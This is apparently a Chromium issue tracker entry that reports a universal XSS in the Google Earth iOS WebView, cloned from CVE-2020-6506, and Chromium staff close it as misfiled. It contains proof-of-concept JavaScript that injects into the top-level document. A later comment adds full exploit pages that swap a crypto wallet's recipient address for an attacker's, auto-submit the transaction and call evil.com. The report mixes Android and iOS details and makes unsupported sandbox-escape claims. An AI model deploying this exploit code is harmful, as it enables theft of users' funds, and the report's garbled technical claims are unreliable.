# Security: Android WebView: iframe on different origin can execute arbitrary JavaScript in top document via window.open() or links with _blank target

| Field | Value |
|-------|-------|
| **Issue ID** | [420184706](https://issues.chromium.org/issues/420184706) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Mobile>WebView |
| **Platforms** | Android |
| **CVE IDs** | CVE-2020-6506 |
| **Reporter** | al...@alesandroortiz.com |
| **Assignee** | ct...@chromium.org |
| **Created** | 2025-05-26 |
| **Bounty** | $15,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

# VULNERABILITY DETAILS

Google Earth IOS are vulnerable to UXSS due to configuration WebContent sandbox escape user clicking a link in iOS, you are able to gain code execution outside the WebContent sandbox.

iframe on different origin can execute arbitrary JavaScript in top document via `window.open()` or links with `_blank` target

instance with the default configuration and JavaScript enabled allows an iframe on a different origin to bypass the same origin policy and execute arbitrary JavaScript on the top document. To carry out an attack, an iframe can call `window.open()` with a javascript URL:. As a result, the JavaScript of the iframe is executed in the context of the top document. Other methods of opening a new window, such as links with `target="_blank"` and `href="javascript:...",` produce the same behavior. Due to user activation requirements, performing the attack requires a tap/click, focus, or other event in the iframe that generates user activation consumables by `window.open()`. This behavior appears to occur if the `WebSettings.setSupportMultipleWindows()` Browser option is set to false, which is the default value. Setting the value to true produces safe behavior. When multiple window support is incorrect, the Browser handles new windows with `javascript:` URLs in the same way as new windows with `https://` URLs, i.e. navigating the top document to the provided URL. This causes JavaScript to be executed in the context of the top document.

**For ADDITIONAL DETAILS please see here:** <https://issues.chromium.org/issues/40052335>

# VERSION

Chrome Version: [10.80.0] + stable
Operating System: IOS Latest Version

# REPRODUCTION CASE

## Create an embeddable page with the JavaScript block or the anchor element below:

```
<script> document.body.addEventListener('click', function () { // Payload which writes to parent document and attempts to show JS alert (alerts are not guaranteed to be shown by WebView) window.open('javascript:var elem = document.createElement("p");elem.innerHTML = "**Executed JS in parent origin: "+window.location.origin+"** "; document.body.append(elem);alert("XSS in doc.domain: "+document.domain+", win.origin: "+window.location.origin)'); // Simpler PoC payload if JS alerts are shown by WebView (not guaranteed to be shown) // window.open("javascript:alert('Executed JS in target '+window.location.origin)"); }); </script>

```
```
<a href="javascript:EITHER_PAYLOAD_ABOVE" target="_blank">Run PoC</a>

```
## Create a parent page with an iframe which loads the step 1 page from another origin using either of these configurations:

```
<iframe src="https://DIFFERENT_ORIGIN/iframe.html"></iframe> <iframe src="https://DIFFERENT_ORIGIN/iframe.html" sandbox="allow-popups allow-top-navigation allow-scripts"></iframe>

```
## Steps To Reproduce, tap/click interaction, visible iframe:

- Navigate to <https://earth.google.com/earth/d/1upoiULG0B-mKF5ir_wVI4WuJEbX3yT4w?usp=sharing> "If you have the Google Earth iOS app then it will open directly there."
- Click
- you will be redirected to <https://ik.imagekit.io/zheev/XSS%20via%20window%20open.html> in Google Earth iOS webview
- Tap or Click iframe.
- XSS Trigger

JavaScript is executed in top-level document. HTML is written to top-level document, and if the Browser allows JS alert dialogs, a JS alert dialog is also shown with info from top-level document.

**Expected results :** JavaScript is not executed in top-level document. HTML is not written to top-level document and JS alert dialog is not shown (or a JS alert dialog is shown but with info from iframe document).

**Actual results:** JavaScript is executed in top-level document. HTML is written to top-level document, and if the Browser allows JS alert dialogs, a JS alert dialog is also shown with info from top-level document.

If the target URL has a malicious or compromised iframe, the iframe can perform a UXSS attack with minimal user interaction (tap/click or keystroke). If there is sensitive data in the WebView, it is vulnerable to exfiltration. The content and data of the page can also be modified to benefit the attacker, such as requesting sensitive info from the user while pretending to be the target URL.

**Recommended Fix:** The patched version of Android WebView (83.0.4103.106) was released on Monday, June 15th, 2020: <https://chromereleases.googleblog.com/2020/06/stable-channel-update-for-desktop_15.html> Vendors can and should mitigate ***CVE-2020-6506*** to protect their users using unpatched versions of Browser.

**Supporting Material/References:** <https://hackerone.com/reports/906433> <https://issues.chromium.org/issues/40052335>

**Customer Impact:** A malicious iframe on any page within the vulnerable Webview can perform a UXSS attack on the top-level document with minimal user interaction.
**Some potential impacts:** Reduced User Trust: Users may lose trust in an application if they learn that it is vulnerable to XSS attacks that can manipulate web content.
**Reduced User Activity:**
Users may reduce their use of an app or even delete it from their devices due to security concerns.
**Legal and Regulatory Impact:**
The Company may face legal action or sanctions from regulatory agencies for failing to keep user data secure.
**Vulnerability Addressing Costs:**
Companies must incur costs to fix vulnerabilities, including the development and distribution of software updates.
**Company Reputation:** These vulnerabilities can damage a company's reputation with the public and customers, which can negatively impact sales and business relationships. It is important for companies to immediately fix these vulnerabilities and provide security updates to users to minimize the negative impact

## Attack scenario

A malicious iframe on any page within the vulnerable WebView can perform a UXSS attack on the top-level document with minimal user interaction.

in a scenario where the attacker's goal is to obtain data about example.com. As far as I know, the Google Earth app itself does not automatically provide any sensitive data or APIs to the WebView. However, in another scenario, the attacker's goal could be to modify the page content to their advantage within the WebView. This could be used to obtain data from the user when the user thinks they are entering data requested by example.com. Or display user-trusted.example.com with modified content indicating the next page is secure, then redirect the user to a malicious website. Most, if not all, other XSS impact scenarios are possible. In all scenarios, this could happen to example.com earth.google.com if the compromised/malicious iframe is present on even one page on a trusted resource and no other mitigation is in place. Performing a earth.google.com UXSS attack within the Google Earth app itself would likely be more effective than performing a earth.google.com attack within another vulnerable app.

Given that Safari and other major browsers are not vulnerable to this UXSS, attackers will be forced to use popular vulnerable apps, such as Google Earth, to attack their targets (whether they are individuals or the general public). Even for patched WebView users, there is a benefit to enabling multi-window support in WebView. Enabling it also prevents unwanted top-level navigation to HTTPS URLs using the same technique. For example, an iframe on example.com gets user interaction, then redirects the top-level page to attacker.com. This top-level HTTPS navigation behavior does not allow for phishing attacks in WebView since in most cases^ the current page URL is displayed to the user, but it is still unwanted behavior that could be used to redirect users to malicious ads or attacker-controlled pages that they did not intend to visit.

**CREDIT INFORMATION**
Muhammad Zaid Ghifari - Meta4Sec || Sobat Cyber Indonesia (Kalimantan Utara)

## Attachments

- [Google Earth ios UXss PoC.mp4](attachments/Google Earth ios UXss PoC.mp4) (video/mp4, 4.9 MB)

## Timeline

### pa...@chromium.org (2025-05-26)

[security shepherd] Thanks for the report. This issue seems to be a clone of [issue 40052335](https://issues.chromium.org/issues/40052335). It doesn't really make sense to mention `WebSettings.setSupportMultipleWindows` since this API is android only, which isn't at play here. However, it might be some weird WebKit behavior here at play. I don't have an iOS device currently so I am unable to test this out. droger@ can you help triage this? We might just need to open a bug on WebKit if this reproduces. They might want to do something similar to what we did for WebView.

### pa...@chromium.org (2025-05-26)

Setting sev and foundin conservatively, feel free to reassess.

### ch...@google.com (2025-05-27)

Setting milestone because of s0/s1 severity.

### gh...@gmail.com (2025-05-28)

# Just Additional Information

In the context of the Web3 browser on the crypto wallet application, this vulnerability can be exploited to become a critical vulnerability by manipulating the wallet address during block chain transactions on the Web3 Browser. This vulnerability can also be exploited to steal secret phrases from the victim's wallet in the name of the crypto exchange. so in my opinion this vulnerability has reached a critical level for the scale of its current impact.

Below I attach an overview of the scenario in the form of a demonstration of exploiting a vulnerability into a critical vulnerability by manipulating the wallet address during a blockhain transaction on the Web3 Browser. I titled the vulnerability like this:
"Universal XSS and Remote Code Execution Sandbox Escape Manipulate Transaction {Web3 Browser Name} Wallet IOS"

## UXSS on Top-Origin sites with document.write allows malicious ads inside nested frames to access and steal anything including transaction manipulation

This vulnerability is one of the most serious and critical issues along with Remote Code Execution, Sandbox Escape.
Exploitation Scenario:
In this exploit scenario, the attacker uses an iframe with a different origin embedded in the dApp page loaded in a Web3 Browser . The JavaScript loaded in the iframe can use window.open() or a targeted link\_blank to execute JavaScript code on the top-level document . The attacker can manipulate the blockchain transactions being created by interacting with smart contracts within the application, for example, by changing the recipient address in an Ethereum transaction.
Web3 Browser App are vulnerable to UXSS due to configuration and CVE-2020-6506 Exploitation Steps Related to Blockchain (Smart Contract)

1. The main page (dApp or wallet app) loads a page with an iframe coming from a different origin containing malicious JavaScript .
2. When a user clicks on a link with a target\_blank or when window.open() is called, JavaScript inside the iframe can access the main document and modify transaction elements within it (such as the receiving address for Ethereum transactions).
3. JavaScript executed in the main document modifies the blockchain transactions being processed and redirects the transactions to the attacker's address (changing the recipient address).
4. The modified blockchain transaction is then sent to an Ethereum smart contract , but with the recipient address replaced with the attacker's address.

## Exploit Code

**1. Attacker Iframe Page (Contains Malicious JavaScript)**

This page is loaded in an iframe from a different origin, which has the ability to execute malicious JavaScript on the main document. window.open() is used to open a new tab and modify blockchain transactions.

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploit with CVE-2020-6506</title>
    <script>
        // Function executed when an iframe tries to open a link with window.open()
        function executeExploit() {
            // Use window.open() to open a new window and try modifying the main document
            const maliciousLink = window.open('https://evil.com/test', '_blank');
            
            // Manipulate transactions in primary documents
            setTimeout(function() {
                const topDoc = window.top.document;
                if (topDoc) {
                    // Modify the transaction recipient address in the top-level document form
                    const receiverAddressInput = topDoc.getElementById('recipient-address');
                    if (receiverAddressInput) {
                        receiverAddressInput.value = '0xAttackerAddress';  // Modified address for attackers
                    }

                    // Send the modified transaction to the smart contract
                    const sendButton = topDoc.getElementById('send-transaction');
                    if (sendButton) {
                        sendButton.click();  // Submit the modified transaction
                    }
                }
            }, 1000);  // Wait a moment for the exploitation to succeed
        }
    </script>
</head>
<body>
    <h1>Iframe Exploit for Transaction Manipulation</h1>
    <button onclick="executeExploit()">Run Exploit</button>
    <p>If you press this button, your transaction will be modified and sent to the attacker's address.</p>
</body>
</html>

```

**Function Explanation <https://evil.com/test>**

<https://evil.com/test> is a URL loaded by malicious JavaScript within an iframe, and when `window.open()` is called, it opens a new page that can be used to manipulate the application's main document, although this does not actually have to be a page that the user directly accesses.

However, in the context of the given code, the use of such URLs can be a bit confusing if not explained further. Let's look at the context in more depth:

**1. Window.open() in Exploitation**

- The function `window.open()`is used to open a new page (or new tab) from a running document. In this case, the attacker uses this function to try to exploit a WebView application that loads an iframe.
  `const maliciousLink = window.open('https://evil.com/test', '_blank');`
- The function `window.open()` opens the specified URL ( <https://evil.com/test>) in a new tab or window. This is used to attempt to execute malicious JavaScript within the main document of an application running in a WebView .

**2. Transaction Manipulation on the Main Page**
Once a new window is opened with `window.open()`, malicious JavaScript can try to access the main document and modify elements such as the recipient address in the blockchain transaction form.

In more detail, this is the more important part of the exploit, where `window.open()` opens a new window only to open a malicious link . The main process of the exploit is to manipulate the top-level document (home page) via JavaScript, after which an iframe from a different origin calls `window.open()`.

**3. Purpose of URLhttps://evil.com/test**
The purpose of the URL <https://evil.com/test> in the code is to show where the attacker can manipulate the main document using `window.open()` and malicious JavaScript .

However, this URL does not actually need to be a real page that can be accessed by the user . It is more of a placeholder used to refer to a link opened via `window.open()` , which in turn provides the opportunity to manipulate the main document.

So, in reality, the URL only serves as a placeholder used in the exploit and does not need to actually lead to a page with physical content. What is important is that the URL is used to open a new page , which in some exploit scenarios, can be used to manipulate transactions being processed on the main page.

## 2. Home Page (dApp with Browser) Loaded in IOS Application

This is the main page in an IOS application that loads an iframe from a different origin. This page allows interaction with a smart contract on the blockchain (Ethereum).

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Crypto Wallet</title>
</head>
<body>
    <h1>My Crypto Wallet - Send ETH</h1>

    <!-- Form for transactions with smart contracts -->
    <label for="recipient-address">Recipient Address:</label>
    <input type="text" id="recipient-address" value="0xOriginalTargetAddress" />

    <button id="send-transaction">Send Transaction</button>

    <!-- The WebView loads a page containing an iframe from a different origin -->
    <iframe src="https://ik.imagekit.io/zheev/Attacker%20Iframee.html?updatedAt=1733514308133" width="100%" height="400px"></iframe>
    
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script>
        // Code to send transactions using Web3.js
        document.getElementById('send-transaction').addEventListener('click', function() {
            const web3 = new Web3(window.ethereum);
            const transactionData = {
                from: ethereum.selectedAddress,
                to: document.getElementById('recipient-address').value,  // Modified address
                value: web3.utils.toWei('0.1', 'ether'),
                gas: 21000,
                gasPrice: web3.utils.toWei('10', 'gwei')
            };

            // Send transactions to Ethereum smart contracts
            web3.eth.sendTransaction(transactionData)
                .then((txHash) => {
                    alert('Transaction sent: ' + txHash);
                }).catch((err) => {
                    console.error('Transaction failed:', err);
                });
        });
    </script>
</body>
</html>

```
## Proof of Concept :

- Navigate <https://ik.imagekit.io/zheev/Parent%20page%20(My%20Crypto%20Wallet).html>
- Tap or Click button on iframe
- See the previous page, where the original address is changed to the attacker's address

Code Explanation:
Attacker Iframe (from different origin) :

This iframe page contains a function window.open() that opens a new window with a target\_blank. Once the new window is opened, this JavaScript can access and manipulate the main document (top-level document), including the transaction form .
Manipulation is done by changing the recipient address of the transaction ( from 0xOriginalTargetAddress to 0xAttackerAddress), which is the address owned by the attacker.
After that, the send transaction button in the main document will be clicked, sending the modified transaction to the Ethereum smart contract.

Main Document (dApp or Browser Wallet App) :

This main page contains a transaction form that allows users to send ETH to a modified address.
When the “Send Transaction” button is clicked, the modified transaction will be submitted to the blockchain via Web3.js , and the original recipient address will be replaced with the attacker's address.

Web3.js :

Web3.js is used to send transactions to the Ethereum blockchain, access user accounts from Web3 wallet applications, and send ETH to addresses modified by the attacker.

## Prevention and Mitigation :

To prevent exploitation like this, some important steps that can be taken are:

Validate URL in WebView :

Validating and restricting URLs loaded in WebView is the best way to avoid loading iframes from different origins .
Avoiding loading iframes from unknown or untrusted sources will reduce the risk of this attack.

**Usage sandbox on Iframe :**

Use attributes sandboxon the iframe to limit the ability of JavaScript running within the iframe to manipulate the main document.

**Do Not Use window.open() Without Strict Control :**

Avoid using window.open() or linking to targets\_blank without strict controls, as this can open up potential attacks by giving control over new windows that open.
Impact
allows attackers to leverage iframes originating from different origins to execute arbitrary JavaScript on the main document (top-level document). In this scenario, an attacker can manipulate elements within the application's main page (such as the transaction form) and change the blockchain transaction being created, for example by changing the recipient address.

By using window.open() or a link with the target \_blank, an attacker can open a new tab and execute malicious JavaScript on the top-level document, allowing them to modify transactions and send them to addresses controlled by the attacker.

In the context of a Web3 wallet application or dApp application, this exploit could lead to unauthorized transactions, where users unknowingly send ETH or tokens to the attacker's address, even though they planned to send the funds to a legitimate party.

**Customer Impact:**
A malicious iframe on any page within the vulnerable Web3 Browser can perform a UXSS attack on the top-level document with minimal user interaction.

**Business Impact:**
UXSS (Universal Cross-Site Scripting) vulnerabilities in Google Earth IOS , could have significant business impact.

**Some potential impacts:**

**Reduced User Trust:**\*
Users may lose trust in an application if they learn that it is vulnerable to XSS attacks that can manipulate web content.

***Reduced User Activity:***
Users may reduce their use of an app or even delete it from their devices due to security concerns.

***Legal and Regulatory Impact:***  

The Company may face legal action or sanctions from regulatory agencies for failing to keep user data secure.

***Vulnerability Addressing Costs:***
Companies must incur costs to fix vulnerabilities, including the development and distribution of software updates.

***Company Reputation:***
These vulnerabilities can damage a company's reputation with the public and customers, which can negatively impact sales and business relationships.
It is important for companies to immediately fix these vulnerabilities and provide security updates to users to minimize the negative impact

### pe...@google.com (2025-05-29)

The NextAction date has arrived: 2025-05-29
To opt-out from this automation rule, please add Optout-Blintz-Nextaction-Alert to the "Chromium Labels" custom field.

### [Deleted User] (2025-05-30)

This issue tracker is for issues with the Chrome browser. I see no mention of Chrome or Chromium in this report.

### gh...@gmail.com (2025-05-30)

Hi team,
Why don't you check it first?

### gh...@gmail.com (2025-05-30)

This vulnerability was found in the google earth ios webview. and this vulnerability is exactly the same as the report <https://issues.chromium.org/issues/40052335>

### pg...@google.com (2025-06-15)

Hello, 
thanks for providing more information. However, this bug is not pertinent to Chromium. Please report this bug to Google Earth.

### gh...@gmail.com (2025-08-04)

I actually reported this to them, but they didn't consider it a vulnerability, even though it's clear that <https://issues.chromium.org/issues/40052335> is a highly paid vulnerability for Chromium.

### ch...@google.com (2025-09-06)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/420184706)*
